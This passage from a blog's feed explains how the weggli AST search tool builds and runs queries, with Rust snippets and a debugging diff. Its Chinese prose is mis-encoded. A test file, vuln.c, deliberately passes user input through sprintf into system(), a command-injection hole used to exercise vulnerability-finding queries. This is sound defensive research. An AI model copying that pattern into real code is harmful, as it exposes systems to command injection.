class="line">--add-opens=java.base/java.util=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.nio.charset=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.nio=ALL-UNNAMED</span><br><span class="line">--add-opens=java.base/java.lang.reflect=ALL-UNNAMED</span><br><span class="line">-Dnashorn.args=--no-deprecation-warning</span><br></pre></td></tr></table></figure><p>æ·»åŠ å‚æ•° </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-Xms4096m </span><br><span class="line">-Xmx4096m </span><br><span class="line">-Xmn256m</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://download.csdn.net/course/detail/37655">https://download.csdn.net/course/detail/37655</a></p><p><a href="https://optee.readthedocs.io/en/latest/">https://optee.readthedocs.io/en/latest/</a></p><p><a href="https://armv8-ref.codingbelief.com/zh/">https://armv8-ref.codingbelief.com/zh/</a></p><p><a href="https://edu.csdn.net/lecturer/6964">https://edu.csdn.net/lecturer/6964</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;a href=&quot;#ç¯å¢ƒé…ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¯å¢ƒé…ç½®&quot;&gt;&lt;/a&gt;ç¯å¢ƒé…ç½®&lt;/h2&gt;&lt;p&gt;æœ¬ç¯‡ä¸»è¦æ˜¯ç¯å¢ƒé…ç½®ã€è°ƒè¯•ã€æµç¨‹æ¢³ç†&lt;/p&gt;</summary>
    
    
    
    
    <category term="optee" scheme="https://o0xmuhe.github.io/tags/optee/"/>
    
  </entry>
  
  <entry>
    <title>weggli debug</title>
    <link href="https://o0xmuhe.github.io/2022/07/24/weggli-debug/"/>
    <id>https://o0xmuhe.github.io/2022/07/24/weggli-debug/</id>
    <published>2022-07-24T01:19:32.000Z</published>
    <updated>2022-08-24T15:25:22.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å…³äºWeggli"><a href="#å…³äºWeggli" class="headerlink" title="å…³äºWeggli"></a>å…³äºWeggli</h2><blockquote><p>AST Pattern Search</p></blockquote><p>æ ¸å¿ƒæ˜¯ä½¿ç”¨å’Œ <code>tree-sitter</code> åº“ï¼Œç„¶åæäº† <code>query-tree</code> æ¥åœ¨ <code>AST</code>ä¸Šè¿›è¡Œæœç´¢ï¼Œè¿™åªèƒ½è¯´æ˜¯åŒ¹é…ç‰¹å®šçš„ä»£ç ç‰‡æ®µï¼Œè¿˜è¾¾ä¸åˆ°ç¨‹åºåˆ†æçš„é‚£ä¸ªçº§åˆ«ï¼Œæ‰€ä»¥ç†è®ºä¸Šåªèƒ½è¿‡ç¨‹å†…åˆ†æï¼Œè€Œä¸”æ²¡æœ‰ä¸Šä¸‹æ–‡å•¥çš„ :D  ç›´ç™½ç‚¹è¯´çš„è¯ï¼Œåƒæ˜¯<code>AST</code>çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¸è¿‡æŸç§æ„ä¹‰ä¸Šæ¥è¯´å¯¹äºä½¿ç”¨ç™½ç›’æ–¹æ¡ˆå¿«é€Ÿå¬å›ä¸€äº›æ¼æ´ä¹Ÿæ˜¯ä¸€ç§å€Ÿé‰´å§ã€‚</p><span id="more"></span><p>å½“ç„¶æˆ‘ä¹Ÿç”¨è¿™ä¸ªå·¥å…·åšäº†ä¸€äº›æ‰©å±•ï¼Œç»“åˆå…¶ä»–å·¥å…·è§£å†³äº†ä¸€äº›é—®é¢˜ï¼Œç›®å‰çœ‹æ¥è¿™ä¸ªä¸œè¥¿è¿˜æ˜¯å…·æœ‰ä¸€å®šçš„å¯ç©æ€§çš„ :D </p><h2 id="Weggliå¦‚ä½•å·¥ä½œ"><a href="#Weggliå¦‚ä½•å·¥ä½œ" class="headerlink" title="Weggliå¦‚ä½•å·¥ä½œ"></a>Weggliå¦‚ä½•å·¥ä½œ</h2><blockquote><p>çœ‹ä»£ç ï¼Œè°ƒè¯•åˆ†æ</p></blockquote><h3 id="ideaé…ç½®"><a href="#ideaé…ç½®" class="headerlink" title="ideaé…ç½®"></a>ideaé…ç½®</h3><p>å®‰è£…<code>Rust</code>æ’ä»¶ï¼Œè°ƒè¯•çš„è¯ï¼Œä¼šé»˜è®¤å†å»å®‰è£…<code>Native Debugging Support</code>ï¼Œæœ‰äº†è¿™ä¿©ä¸œè¥¿å°±å¯ä»¥è°ƒè¯•äº†</p><p>é…ç½®ä¼ é€’ç»™weggliçš„å‚æ•°çš„è¯è·Ÿåœ¨ <code>--</code> åé¢å³å¯ : </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run --package weggli --bin weggli --  <span class="string">&quot;&#123;<span class="variable">$func</span>(<span class="variable">$b</span>);system(<span class="variable">$b</span>);&#125;&quot;</span> -R <span class="string">&quot;func=printf$&quot;</span> /path/to/src</span><br></pre></td></tr></table></figure><h3 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h3><blockquote><p>åªæè¿°æ ¸å¿ƒæµç¨‹</p></blockquote><h4 id="query-tree-æ„å»º"><a href="#query-tree-æ„å»º" class="headerlink" title="query-tree æ„å»º"></a>query-tree æ„å»º</h4><p>å‚è€ƒ <a href="https://tree-sitter.github.io/tree-sitter/">tree-sitteræ–‡æ¡£</a></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> work: <span class="built_in">Vec</span>&lt;WorkItem&gt; = args</span><br><span class="line">        .pattern</span><br><span class="line">        .iter()</span><br><span class="line">        .map(|pattern| &#123;</span><br><span class="line">            <span class="keyword">match</span> parse_search_pattern(pattern, args.cpp, args.force_query, &amp;regex_constraints) &#123;</span><br><span class="line">                <span class="literal">Ok</span>(qt) =&gt; &#123;</span><br><span class="line">                    <span class="keyword">let</span> identifiers = qt.identifiers();</span><br><span class="line">                    variables.extend(qt.variables());</span><br><span class="line">                    WorkItem &#123; qt, identifiers &#125;</span><br><span class="line">        <span class="comment">// ....</span></span><br></pre></td></tr></table></figure><p>æ„é€  <code>WorkItem&#123;qt, identifiers&#125;</code></p><ul><li>qt : query-tree, tree-sitterçš„Treeå¯¹è±¡</li><li>identifiers : æ ‡è¯†ç¬¦ï¼Œqueryä¸­â€ç»ˆç»“ç¬¦â€ </li></ul><p>è°ƒç”¨é“¾:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main</span><br><span class="line">    parse_search_pattern</span><br><span class="line">        weggli::parse(pattern, is_cpp) // è¿”å›Treeå¯¹è±¡</span><br><span class="line">        //ä¿®æ­£pattern</span><br><span class="line">        validate_query</span><br><span class="line">        build_query_tree</span><br></pre></td></tr></table></figure><blockquote><p> ä¿®æ­£pattern : weggliå¤„ç†äº†â€œä¸åˆæ³•çš„â€æ ¼å¼ï¼Œå¦‚:</p></blockquote><ul><li><code>memcpy(a,b,size)</code> -&gt; <code>memcpy(a,b,size);</code></li><li><code>memcpy(a,b,size);</code> -&gt; <code>&#123;memcpy(a,b,size);&#125;</code></li></ul><blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">validate_query(&amp;tree, p, force_query)? <span class="comment">// è¿”å› TreeCursorå¯¹è±¡ï¼Œç”¨äºéå†AST</span></span><br></pre></td></tr></table></figure></blockquote><p>è¯­æ³•åˆæ³•æ€§æ£€æŸ¥ï¼Œå¦‚æœ <code>force_query</code>ä¸º<code>True</code>ï¼Œæ„å‘³ç€å¿½ç•¥è¿™äº›è¯­æ³•é”™è¯¯</p><p>å¦‚ : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220707154439731.png" alt="image-20220707154439731"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;$func($b);_($b);&#125;&quot;</span><br></pre></td></tr></table></figure><p>å¯¹åº” : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(translation_unit </span><br><span class="line">    (</span><br><span class="line">        compound_statement </span><br><span class="line">        (</span><br><span class="line">            expression_statement (call_expression function: (identifier) arguments: (argument_list (identifier)))</span><br><span class="line">        ) </span><br><span class="line">        (</span><br><span class="line">            expression_statement (call_expression function: (identifier) arguments: (argument_list (identifier)))</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>åŒæ—¶è¿˜ä¸å…è®¸ : </p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220707155732813.png" alt="image-20220707155732813"></p><p>è¿”å›çš„æ˜¯ : <code>c.goto_first_child();</code>ï¼Œå³ èŠ±æ‹¬å·ä¸­é—´çš„å†…å®¹</p><blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">Ok</span>(build_query_tree(</span><br><span class="line"> p,</span><br><span class="line"> &amp;<span class="keyword">mut</span> c,</span><br><span class="line"> is_cpp,</span><br><span class="line"> <span class="literal">Some</span>(regex_constraints.clone()),</span><br><span class="line">))</span><br><span class="line"></span><br><span class="line">_build_query_tree(source, cursor, <span class="number">0</span>, is_cpp, <span class="literal">false</span>, <span class="literal">false</span>, regex_constraints)</span><br></pre></td></tr></table></figure></blockquote><p>QueryTreeæ•°æ®ç»“æ„:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="class"><span class="keyword">struct</span> <span class="title">QueryTree</span></span> &#123;</span><br><span class="line">    query: Query,</span><br><span class="line">    captures: <span class="built_in">Vec</span>&lt;Capture&gt;,</span><br><span class="line">    negations: <span class="built_in">Vec</span>&lt;NegativeQuery&gt;,</span><br><span class="line">    variables: HashSet&lt;<span class="built_in">String</span>&gt;,</span><br><span class="line">    id: <span class="built_in">usize</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è½¬æ¢çš„<code>tree_sitter query</code> (æ ¸å¿ƒé€»è¾‘éƒ½åœ¨ <code>builder.rs</code> çš„ <code>QueryBuilder.build</code>) </p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Translate the tree below `c` into a tree-sitter query string.</span><br><span class="line">&quot;&#123;$func($b);_($b);&#125;&quot;</span><br></pre></td></tr></table></figure></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tree_sitter query 1: ((call_expression function:[(identifier) (field_expression) (field_identifier)] @0 arguments:(argument_list [(identifier) (field_expression) (field_identifier)] @1)) )([(identifier) (field_expression) (field_identifier)] @2 )</span><br><span class="line">tree_sitter query 0: (function_definition body: (compound_statement) @0) @1</span><br></pre></td></tr></table></figure><p>æ·±åº¦ä¼˜å…ˆçš„æ–¹å¼é€’å½’ç”Ÿæˆquery tree stringï¼ŒæŒ‰ç…§ASTè§£æå‡ºæ¥ä¸åŒçš„èŠ‚ç‚¹ï¼Œåé¢è·Ÿç€çš„ <code>@x</code> ç”¨æ¥åŒºåˆ†ä¸åŒçš„ <code>identifier</code>ï¼Œæ–¹ä¾¿åé¢åšåŒ¹é…ã€‚</p><hr><p>å¦‚ç®€å•çš„ <code>&#123;printf(var, bar);&#125;</code> ç”Ÿæˆçš„ <code>query-tree</code>æ˜¯ : </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">((call_expression         </span><br><span class="line">        function:  [(field_expression field: (field_identifier)@0) (identifier) @0] </span><br><span class="line">        arguments: (argument_list </span><br><span class="line">                        . (identifier) @1 </span><br><span class="line">                        . (identifier) @2)</span><br><span class="line">                    ) </span><br><span class="line">                        </span><br><span class="line">                        (#eq? @0 &quot;printf&quot;)(#eq? @1 &quot;var&quot;)(#eq? @2 &quot;bar&quot;)) // captures</span><br></pre></td></tr></table></figure><p>ç»“åˆtree-sitterçš„playgroundæ¥çœ‹å°±å¾ˆå®¹æ˜“çœ‹æ˜ç™½äº†:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/tree-sitter-playground.png" alt="tree-sitter-playground"></p><h4 id="queryæ‰§è¡Œ-pattern-åŒ¹é…"><a href="#queryæ‰§è¡Œ-pattern-åŒ¹é…" class="headerlink" title="queryæ‰§è¡Œ(pattern åŒ¹é…)"></a>queryæ‰§è¡Œ(pattern åŒ¹é…)</h4><p>åœ¨æ‰§è¡Œqueryä¹‹å‰ä¼šåš</p><ul><li><p>å¯¹äºéœ€è¦æ­£åˆ™åŒ¹é…çš„ <code>identifer</code>åšåˆæ³•æ€§ç¡®è®¤</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> regex_constraints.variables() &#123;</span><br><span class="line">        <span class="keyword">if</span> !variables.contains(v) &#123;</span><br><span class="line">            eprintln!(<span class="string">&quot;&#x27;&#123;&#125;&#x27; is not a valid query variable&quot;</span>, v.red());</span><br><span class="line">            std::process::exit(<span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>ç¡®å®šå¾…è§£ææºç æ–‡ä»¶(<code>Verify that the --include and --exclude regexes are valid.</code>) ä¸»è¦æ˜¯æ ¹æ®åç¼€æ¥</p></li></ul><p>éšåå°±æ˜¯é€šè¿‡ç®¡é“æ¥å¤„ç†ï¼Œåˆ†ä¸ºï¼š</p><ul><li>æ–‡ä»¶è¯»å– &amp; ASTè§£æ <code>let (ast_tx, ast_rx) = mpsc::channel();</code></li><li>QueryTree åŒ¹é… &amp; ç»“æœè¾“å‡º <code>let (results_tx, results_rx) = mpsc::channel();</code></li></ul><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Spawn worker to iterate through files, parse potential matches and forward ASTs</span></span><br><span class="line">s.spawn(<span class="keyword">move</span> |_| parse_files_worker(files, ast_tx, w, cpp));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run search queries on ASTs and apply CLI constraints</span></span><br><span class="line"><span class="comment">// on the results. For single query executions, we can</span></span><br><span class="line"><span class="comment">// directly print any remaining matches. For multi</span></span><br><span class="line"><span class="comment">// query runs we forward them to our next worker function</span></span><br><span class="line">s.spawn(<span class="keyword">move</span> |_| execute_queries_worker(ast_rx, results_tx, w, &amp;args));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> w.len() &gt; <span class="number">1</span> &#123;</span><br><span class="line">    s.spawn(<span class="keyword">move</span> |_| multi_query_worker(results_rx, w.len(), before, after));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**è¿™ç©æ„æè¿°èµ·æ¥å°±åƒä¸ªæµæ°´çº¿ :D **</p><p>è¯¦ç»†æè¿°çš„è¯å°±æ˜¯ï¼šåœ¨æœ‰äº† <code>query-tree</code>å°±éœ€è¦æŠŠç›®æ ‡æ–‡ä»¶ï¼Œè§£æ(<code>parse_files_worker</code>)æˆ <code>(Tree, source_code)</code>ï¼Œç»“æœå‘é€åˆ° <code>ast_tx</code>ï¼Œç„¶åä»<code>ast_rx</code>è·å–è¿™äº›ä¿¡æ¯æ¥æ‰§è¡ŒæŸ¥è¯¢æ“ä½œ(<code>execute_queries_worker</code>)ï¼›ç»“æœæ”¾åœ¨ <code>result_tx</code>ï¼Œåé¢å¤„ç†ç»“æœçš„å‡½æ•°ä¼šä»<code>result_rx</code>è·å–ï¼Œç„¶åè¾“å‡ºã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">parse_files_worker(files, ast_tx, w, cpp);</span><br><span class="line">    weggli::parse(....);</span><br><span class="line">execute_queries_worker(ast_rx, results_tx, w, &amp;args); <span class="comment">// w  WorkItemï¼Œé‡Œé¢æœ‰query-tree</span></span><br><span class="line">    qt.matches(tree.root_node(), &amp;source);</span><br><span class="line">    match_internal(...);</span><br><span class="line">    QueryCursor.matches(...);</span><br><span class="line">    QueryTree.process_match(...);</span><br></pre></td></tr></table></figure><blockquote><p>TODO: éœ€è¦ç»†è¯»é€»è¾‘</p></blockquote><p>è¿™é‡Œç®€å•çš„åŠ ä¸€å¥printä¹‹ç±»çš„å¯ä»¥æ¥çœ‹çœ‹æ¯æ¬¡queryçš„æ—¶å€™ç›®æ ‡treeæ˜¯å•¥æ ·çš„(ç”Ÿæˆè¿‡ç¨‹å’Œquery treeç±»ä¼¼)</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run query</span></span><br><span class="line"><span class="keyword">let</span> tmp_tree = tree.root_node().to_sexp();</span><br><span class="line"><span class="keyword">let</span> matches = qt.matches(tree.root_node(), &amp;source);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220801202121736.png" alt="image-20220801202121736"></p><p>æ‰€ä»¥è¿™å°±è½¬æ¢æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²åŒ¹é…çš„é—®é¢˜ï¼Œç»“åˆä¹‹å‰çš„ <code>-R</code> ï¼Œèƒ½æ”¯æŒæ­£åˆ™åŒ¹é…ï¼Œ<strong>æ‰€ä»¥è¯´weggliæ˜¯åœ¨ASTä¸Šææ­£åˆ™åŒ¹é…ä¸€ç‚¹éƒ½æ²¡è¯´é”™ :D</strong></p><h4 id="multi-query-p-å‚æ•°"><a href="#multi-query-p-å‚æ•°" class="headerlink" title="multi-query(-p å‚æ•°)"></a>multi-query(<code>-p</code> å‚æ•°)</h4><h5 id="æ¼æ´æ¨¡å‹æµ‹è¯•"><a href="#æ¼æ´æ¨¡å‹æµ‹è¯•" class="headerlink" title="æ¼æ´æ¨¡å‹æµ‹è¯•"></a>æ¼æ´æ¨¡å‹æµ‹è¯•</h5><p><a href="https://github.com/googleprojectzero/weggli/issues/21">Question - query construction </a> è¿™ä¸ªissueé‡Œæåˆ°äº†è¿™ä¸ªåœºæ™¯ï¼Œå…ˆè¿˜åŸä¸€ä¸‹åœºæ™¯ : </p><p><code>vuln.c</code> æ˜¯ä¸ªç±»ä¼¼çš„æƒ…å†µï¼Œå°è¯•query</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wtf</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> bar)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    wtf(bar);</span><br><span class="line"></span><br><span class="line">    system(bar);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">2048</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;/bin/bash %s &gt; /tmp&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foo(<span class="number">11111</span>);</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220803130012370.png" alt="image-20220803130012370"></p><ul><li>åŒ¹é…å‡½æ•°å®šä¹‰(<code>vuln</code>)</li><li>åŒ¹é…func call <code>vuln(argv[1])</code></li></ul><p>å‡å¦‚æ²¡æœ‰å¯¹vulnçš„è°ƒç”¨ï¼Œé‚£å°±ä¸å›è¿”å›ç»“æœ</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220803130323523.png" alt="image-20220803130323523"></p><h5 id="multi-query-å®ç°"><a href="#multi-query-å®ç°" class="headerlink" title="multi-query å®ç°"></a>multi-query å®ç°</h5><p>è¿™å—é€»è¾‘ä¸»è¦åœ¨ <code>multi_query_worker</code> ï¼Œå³å­˜åœ¨å¤šä¸ªworkitemçš„æ—¶å€™ä¼šè§¦å‘ï¼Œå°±æ˜¯åœ¨åŒ¹é…çš„æ—¶å€™ä¼šç»“åˆè¿™äº›queryï¼Œå³å°†ç¬¬ä¸€ä¸ªqueryåŒ¹é…åˆ°çš„ç»“æœå…ˆæ”¶é›†èµ·æ¥</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut</span> query_results = <span class="built_in">Vec</span>::with_capacity(num_queries);</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..num_queries &#123;</span><br><span class="line">    query_results.push(<span class="built_in">Vec</span>::new());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// collect all results</span></span><br><span class="line"><span class="keyword">for</span> ctx <span class="keyword">in</span> results_rx &#123;</span><br><span class="line">    query_results[ctx.query_index].push(ctx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®åé¢çš„queryå»åšè¿‡æ»¤ï¼Œæ‰¾åˆ°æ»¡è¶³çš„patternå°±æ‰“å°å‡ºæ¥</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> filter = |x: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;ResultsCtx&gt;, y: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;ResultsCtx&gt;| &#123;</span><br><span class="line">        x.retain(|r| &#123;</span><br><span class="line">            y.iter()</span><br><span class="line">                .any(|f| r.result.chainable(&amp;r.source, &amp;f.result, &amp;f.source))</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..query_results.len() &#123;</span><br><span class="line">        <span class="keyword">let</span> (part1, part2) = query_results.split_at_mut(i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> a = part1.last_mut().unwrap();</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> part2 &#123;</span><br><span class="line">            filter(a, b);</span><br><span class="line">            filter(b, a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ–¹ä¾¿è°ƒè¯•åšçš„ä¿®æ”¹"><a href="#æ–¹ä¾¿è°ƒè¯•åšçš„ä¿®æ”¹" class="headerlink" title="æ–¹ä¾¿è°ƒè¯•åšçš„ä¿®æ”¹"></a>æ–¹ä¾¿è°ƒè¯•åšçš„ä¿®æ”¹</h2><h3 id="1-æ‰“å°-query-tree-å’Œ-æºç -ASTæ–¹ä¾¿å®šä½é—®é¢˜"><a href="#1-æ‰“å°-query-tree-å’Œ-æºç -ASTæ–¹ä¾¿å®šä½é—®é¢˜" class="headerlink" title="1. æ‰“å° query-tree å’Œ æºç  ASTæ–¹ä¾¿å®šä½é—®é¢˜"></a>1. æ‰“å° query-tree å’Œ æºç  ASTæ–¹ä¾¿å®šä½é—®é¢˜</h3><p>query-treeçš„è¯å¢åŠ ä¸€ä¸ª <code>-v</code> å‚æ•°å°±è¡Œï¼Œä¼šæŠŠquery treeæ‰“å°å‡ºæ¥</p><p><strong>å°‘é‡ä»£ç æµ‹è¯•è¿™æ ·æ˜¯å¯ä»¥çš„</strong>ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨logæ¨¡å—æŠŠä¿¡æ¯æ‰“å‡ºæ¥ï¼Œä¸è¿‡æ•°æ®å¤ªå¤šäº†ã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/main.rs b/src/main.rs</span></span><br><span class="line"><span class="comment">index a819c5c..caf9a51 100644</span></span><br><span class="line"><span class="comment">--- a/src/main.rs</span></span><br><span class="line"><span class="comment">+++ b/src/main.rs</span></span><br><span class="line"><span class="meta">@@ -468,6 +468,8 @@</span> fn execute_queries_worker(</span><br><span class="line">                 .enumerate()</span><br><span class="line">                 .for_each(|(i, WorkItem &#123; qt, identifiers: _ &#125;)| &#123;</span><br><span class="line">                     // Run query</span><br><span class="line"><span class="addition">+                    let tmp_tree = tree.root_node().to_sexp();</span></span><br><span class="line"><span class="addition">+                    info!(&quot;AST : &#123;&#125;&quot;, tmp_tree);</span></span><br><span class="line">                     let matches = qt.matches(tree.root_node(), 